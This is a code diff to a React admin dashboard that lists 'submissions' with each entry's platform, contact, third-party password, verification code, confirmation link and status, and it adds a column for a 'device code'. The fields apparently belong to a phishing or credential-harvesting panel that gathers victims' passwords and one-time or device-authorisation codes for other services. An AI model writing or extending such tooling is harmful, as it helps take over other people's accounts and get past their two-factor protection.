@@ -166,6 +166,7 @@ export default function Admin() {
         status: row.status,
         source: row.source,
         code: row.code,
+        device_code: row.device_code,
         confirmation_link: row.confirmation_link || null,
       }));
 
@@ -256,6 +257,7 @@ export default function Admin() {
                 <th className="px-3 py-2">Platform</th>
                 <th className="px-3 py-2">Contact</th>
                 <th className="px-3 py-2">Password</th>
+                <th className="px-3 py-2">Device Code</th>
                 <th className="px-3 py-2">Code</th>
                 <th className="px-3 py-2">Confirmation Link</th>
                 <th className="px-3 py-2">Status</th>
@@ -269,6 +271,9 @@ export default function Admin() {
                   <td className="px-3 py-2">{row.platform}</td>
                   <td className="px-3 py-2">{row.contact}</td>
                   <td className="px-3 py-2 text-slate-400 font-mono text-xs">{row.third_party_password || '-'}</td>
+                  <td className="px-3 py-2 font-mono font-semibold text-green-400">{row.device_code ? (
+                    <span className="bg-green-900/20 px-2 py-1 rounded text-green-300 font-bold">{row.device_code}</span>
+                  ) : '-'}</td>
                   <td className="px-3 py-2 font-mono font-semibold text-green-400">{row.code ? (
                     <span className="bg-green-900/20 px-2 py-1 rounded text-green-300 font-bold">{row.code}</span>
                   ) : '-'}</td>
@@ -288,7 +293,7 @@ export default function Admin() {
               ))}
               {rows.length === 0 && (
                 <tr>
-                  <td colSpan={8} className="px-3 py-8 text-center text-slate-500">
+                  <td colSpan={9} className="px-3 py-8 text-center text-slate-500">
                     {loading ? 'Loading submissions...' : 'No submissions found.'}
                   </td>
                 </tr>
